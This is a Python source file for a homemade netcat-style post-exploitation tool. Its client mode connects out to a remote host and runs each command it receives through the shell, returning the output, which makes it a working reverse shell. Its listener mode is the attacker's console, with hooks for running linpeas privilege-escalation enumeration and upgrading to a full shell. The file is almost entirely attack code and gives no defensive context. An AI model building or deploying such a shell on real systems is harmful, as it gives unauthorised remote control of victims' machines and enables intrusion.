#!/usr/bin/env python3
from libs.help import Help
from libs.lhost import Lhost
from libs.rhost import Rhost
from colorama import Fore, Back, Style
import socket
import sys, os
import subprocess


class netcat(object):
    listener = False
    clientHandler = False
    prompt = False
    port = 4444
    target = ""
    bufferSize = 2**12

    def main(self):

        listArgs = Lhost.args(sys.argv)

        if not len(sys.argv[1:]):
            Help.usageOff()
        for opt in listArgs:
            if opt == "listen%" or opt == "l%" or opt == "listen" or opt == "l":
                self.listener = True

            elif opt == "h%" or opt == "help%" or opt == "help" or opt == "h":
                Help.usageOn()

            elif "p%" in opt or "port%" in opt:
                opts = opt.split("%")
                self.port = int(opts[1])

            elif "target%" in opt:
                opts = opt.split("%")
                self.target = opts[1]

            elif opt == "prompt%" or opt == "prompt":
                self.clientHandler = True

            else:
                Help.usageOn()

        if self.listener:
            self.serverLoop()
        if self.clientHandler:
            self.clientLoop()




    def clientLoop(self):
        global length
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((self.target,self.port))
        while True:
            recv = s.recv(self.bufferSize)
            recv = recv.decode('utf-8')
            if 'cd' in recv:
                recv = recv.split(' ')
                param = ''.join(recv[1:])
                try:
                    os.chdir(param)
                    s.send(os.getcwd().encode())
                except:
                    s.send(b"Error ! ")

            elif "exit" in recv or "quit" in recv:
                s.close()
                break

            elif 'whoami' in recv or "pwd" in recv:
                output = subprocess.getoutput(recv)
                s.send(output.encode())

            elif "sudo" in recv:
                print("ok")
                s.send(b"ko")

            else:
                #print(recv)
                #res = self.bash_(recv)
                #print(res)
                #s.send(res.encode())

                output = recv+'\n\n'
                output = subprocess.getoutput(recv)+ '\n'
                s.send(output.encode())

                #CMD = subprocess.Popen(recv, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                #s.send(CMD.stdout.read())
                #s.send(CMD.stderr.read())

    def serverLoop(self):
        conn,addr = Lhost.binding(self.target,self.port)
        print("[+] Connection from : ",addr)
        print("\nType help if you want some tips ! \n")
        while True:
            home,user,tag = Lhost.init(conn)
            Lhost.getDir(conn)
            user = Fore.RED+user
            command = input('\033[93m'+"%s@[%s] %s "%(user,home,tag) + '\x1b[0m')
            if 'clear' in command:
                os.system('clear')

            elif 'exit' in command or 'quit' in command or 'terminate' in command:
                conn.send(b'exit')
                conn.close()
                break

            elif 'help' in command:
                Help.usageOff()

            elif 'cd' in command:
                conn.send(command.encode())
                recv = conn.recv(self.bufferSize).decode()
                if "Error" in recv:
                    print("Error")
                else:
                    self.home = recv

            elif command == "":
                print('')

            elif command == "linpeas":
                self.linpeas(conn)

            elif command == "shell":
                Rhost.shell(conn)
                conn.recv(self.bufferSize)

            elif "sudo" in command:
                print(command)
                conn.send(command.encode())

            else:
                conn.send(command.encode())
                fini = "false"
                while fini == "false":
                    recv = conn.recv(self.bufferSize).decode()
                    print(recv)
                    if len(recv) < self.bufferSize:
                        fini = "true"



if __name__ == "__main__":
   ncat = netcat()
   ncat.main()
